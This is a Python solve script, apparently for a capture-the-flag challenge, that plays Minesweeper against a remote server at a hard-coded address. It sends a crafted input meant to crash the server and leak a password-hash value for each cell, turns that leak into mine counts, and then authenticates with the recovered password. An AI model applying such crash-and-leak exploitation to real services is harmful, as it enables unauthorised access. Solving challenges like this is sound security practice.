import time
from socket import socket
from collections import defaultdict

ADDRESS = ('134.122.112.105', 20009)

TOKEN = None
GAME = defaultdict(lambda:' ')

A = 10
B = 11
C = 12
D = 13
E = 14
F = 15

def finished():
    """
    If you finished solving the Minesweeper board,
    print out your password.
    """
    s = []
    for i in range(256):
        if GAME[i] == ' ':
            print("No you aren't.")
            return
        if GAME[i] == 'X':
            s.append('1')
        else:
            s.append('2')
    print('Your token is:')
    print(TOKEN)
    print('And the password is:')
    password = ' '.join(s)
    print(password)
    print()
    print('Trying to authenticate...')
    print()

    s = socket()
    s.connect(ADDRESS)
    s.recv(2048)
    s.send(b'y\n')
    time.sleep(0.1)
    s.recv(2048)
    s.send(bytes(TOKEN + '\n', 'ascii'))
    time.sleep(0.1)
    s.recv(2048)
    s.send(bytes(password + '\n', 'ascii'))
    time.sleep(0.1)

    resp = s.recv(2048).decode('ascii')
    print(resp)
    s.close()

def create_token():
    """
    Asks the server for a new Token,
    and saves it globally for you to use in the next method calls.
    """
    global TOKEN
    
    s = socket()
    s.connect(ADDRESS)
    s.recv(2048)
    s.send(b'n\n')
    time.sleep(0.1)
    resp = s.recv(2048).decode('ascii')
    #print(resp)
    token = resp.split('\n')[2][3:3+16]
    s.close()
    TOKEN = token
    print('Caught token: {}'.format(token))

def play(x, y, should_print = True):
    """
    Tries to press the spot at (x, y) on the Minesweeper board
    matching the currently saved TOKEN.
    Prints the resulting board after getting data from the server.
    """
    global GAME
    
    s = socket()
    s.connect(ADDRESS)
    s.recv(2048)
    s.send(b'y\n')
    time.sleep(0.1)
    s.recv(2048)
    s.send(bytes(TOKEN + '\n', 'ascii'))
    time.sleep(0.1)
    s.recv(2048)
    s.send(bytes(get(x, y) + '\n', 'ascii'))
    time.sleep(0.1)

    resp = s.recv(2048).decode('ascii')
    s.close()
    
    if 'random' in resp:
        print('Lost :(')
        GAME = defaultdict(lambda:' ')
    else:
        float_text = resp.split('\n')[1].split('file ')[1][:-1]
        res = float(float_text)
        num = parse(x, y, res)
        GAME[x + 16*y] = str(num)
        if num == 0:
            if should_print:
                print('Just a sec...', end='')
            for i in [-1, 0, 1]:
                for j in [-1, 0, 1]:
                    x0 = x + i
                    y0 = y + j
                    if 0 <= x0 < 16 and 0 <= y0 < 16 and GAME[x0 + 16*y0] == ' ':
                        print('.', end='')
                        play(x0, y0, False)
        if should_print:
            print_board()

def mark(x, y):
    """
    Marks the spot at (x, y) on the Minesweeper board
    as a spot containing a mine.
    Then prints the resulting board.
    """
    global GAME
    
    if GAME[x + 16*y] == ' ':
        GAME[x + 16*y] = 'X'
    elif GAME[x + 16*y] == 'X':
        GAME[x + 16*y] = ' '
    else:
        raise Exception()
    print_board()

def print_board():
    """
    Prints the currently saved state of the game board.
    """
    global GAME

    res = '\n'
    s = '0123456789ABCDEF'
    res += (' |' + '|'.join(list(s))) + '\n'
    for y in range(16):
        res += ('-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-')  + '\n'
        res += s[y]
        for x in range(16):
            res += '|' + GAME[x+16*y]
        res += '\n'
    res += '\n'

    print(res)

def get(x, y):
    """
    Gets an input that will make the server crash,
    leaking the password hash at coordinate (x, y).
    """
    return ' '.join(['1' if (x != i or y != j) else '' for j in range(16) for i in range(16)])

def parse(x, y, res):
    """
    Gets a coordinate (x, y),
    and a leaked hash (res),
    And figures out how many mines are surrounding the spot (x, y).
    """
    a = x in [0, 15]
    b = y in [0, 15]
    c = int(a) + int(b)
    if c == 0:
        n = 8
    if c == 1:
        n = 5
    if c == 2:
        n = 3

    return round(6*((n+1)/res - 1/2 - n/3))
